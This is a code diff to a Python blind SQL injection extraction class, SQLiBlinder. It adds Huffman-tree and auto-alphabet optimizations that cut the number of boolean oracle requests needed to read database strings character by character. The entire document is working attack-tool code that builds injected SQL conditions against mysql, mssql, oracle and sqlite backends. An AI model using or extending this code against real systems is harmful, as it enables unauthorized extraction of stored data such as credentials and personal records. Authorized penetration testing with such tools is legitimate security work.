@@ -1,6 +1,7 @@
 from concurrent.futures import ThreadPoolExecutor
 from .engines import *
 from .statistics import *
+from .huffman_tree import huffman_tree, score, get_chars_in_tree
 import logging
 from enum import Enum
 
@@ -14,7 +15,7 @@ class SQLiBlinder:
 	def __init__(self, request_func, dbms, multithreaded=True, threads=16, 
 				auto_string_convert=True, get_long_strings=False, 
 				error_processing_strategy=ErrorProcessStrategy.FULL_SEARCH,
-				char_in_position_opt=True):
+				char_in_position_opt=True, alphabet_autocreate_opt=True,huffman_tree_opt=True):
 		"""`request_func` - function, that take 1 param. If param is "1=1" request_func must return True,if param is "1=0" request_func must return False
 		 `dbms` - one of ["mysql","mssql","oracle","sqlite"]
 		 `multithreaded` - if True run number of threads, else one
@@ -22,6 +23,8 @@ class SQLiBlinder:
 		 `auto_string_convert` - convert all columns to string (via CAST(col as TEXT) etc.
 		 `get_long_strings` - do find symbols after 64
 		 `char_in_position_opt` - do statistics analyze of chars in same position. For example, GUID always have same symbol dash in known position. If statistics shows that symbol always in same position, then check this char first.
+		 `alphabet_autocreate_opt` - auto build charset for search based on already found characters
+		 `huffman_tree_opt` - make huffman-tree search; huffman tree is built based on selective distribution
 		 """
 		self.request_func = request_func
 		self.dbms = dbms.lower()
@@ -39,6 +42,10 @@ class SQLiBlinder:
 		self.statistics = Statistics()
 		self.char_in_position_opt = char_in_position_opt
 		self.char_in_position_opt_count = 3
+		self.alphabet_autocreate_opt = alphabet_autocreate_opt
+		self.alphabet_autocreate_limit = 64
+		self.huffman_tree_opt = huffman_tree_opt
+		self.huffman_tree_limit = 64
 
 	def get_column_expression(self,column):
 		if self.auto_string_convert:
@@ -96,9 +103,12 @@ class SQLiBlinder:
 			return f"({query})>={value}"
 
 	def build_sql_binary_set_query(self,query,subset):
-		
 		converted_subset = ','.join([self.dbms.binary_set_format.format(ord(a)) for a in subset])
 		return f"({query}) not in ({converted_subset})"
+
+	def build_sql_huffman_tree_query(self,query,subset):
+		converted_subset = ','.join([self.dbms.binary_set_format.format(ord(a)) for a in subset])
+		return f"({query}) in ({converted_subset})"
 
 	def get_bool(self, sql):
 		self.total_requests+=1
@@ -167,6 +177,37 @@ class SQLiBlinder:
 
 			#print(f'new subset: {new_alph_set}')
 
+	def huffman_tree_search(self,s,char_statistics):
+		char_statistics['CANNARY'] = 1
+		tree = huffman_tree(char_statistics)
+		while True:
+			if type(tree[1])==float:
+				if tree[0] == 'CANNARY':
+					return False
+				else:
+					return tree[0]
+			left = tree[0]
+			right = tree[1]
+			left_chars = get_chars_in_tree(left)
+			right_chars = get_chars_in_tree(right)
+			#print (f'left: {left_chars}, right: {right_chars}')
+			if 'CANNARY' in left_chars:
+				check = right
+				not_check = left
+			else:
+				check = left
+				not_check = right
+			check_chars = get_chars_in_tree(check)
+			sql = self.build_sql_huffman_tree_query(s,check_chars)
+			r = self.get_bool(sql)
+			#print (f'SQL: {sql}, result: {r}')
+			if r:
+				new_tree = check
+			else:
+				new_tree = not_check
+			tree = new_tree
+			#print (f'choose: {get_chars_in_tree(tree)}')
+
 	def get_count(self, table_name, where=None):
 		s = self.define_count(table_name, where)
 		return self.binary_search(s, 32, False, True, not_char_request=True)
@@ -204,6 +245,28 @@ class SQLiBlinder:
 					if res!=False:
 						#print(f'Found optimized symbol: {res}')
 						res_found=True
+		# huffman tree section
+		if (res_found == False) and (alphabet is None) and (self.huffman_tree_opt == True): 
+			# check if we have enough data for huffman tree
+			chars = self.statistics.get_chars(table_name, column_name)
+			already_found_chars = sum([chars[k] for k in chars] )
+			if already_found_chars >= self.huffman_tree_limit:
+						#enough
+				res = self.huffman_tree_search(s,chars)
+				if res != False:
+					res_found = True
+		# alphabet autocreate section (useless if huffman tree already launched)
+		if (res_found == False) and (alphabet is None) and (self.alphabet_autocreate_opt == True) and (self.huffman_tree_opt==False): 
+			# if we have enough statistics lets create alphabet
+			chars = self.statistics.get_chars(table_name, column_name)
+			already_found_chars = sum([chars[k] for k in chars] )
+			if already_found_chars >= self.alphabet_autocreate_limit:
+						#enough
+				res = self.binary_search_set(s,chars.keys())
+				if res != False:
+					res_found = True
+
+
 		if res_found==False:
 			if alphabet is None:
 				res = chr(self.binary_search(s, self.ascii_search_limit, True))
@@ -231,7 +294,7 @@ class SQLiBlinder:
 			for i in range(l):
 				r += self.get_char(table_name, column_name,
 								   index, i + 1, where, order_by, alphabet)
-				# print r
+				
 			return r + suffix
 		else:
 			with ThreadPoolExecutor(max_workers=self.threads) as pool:
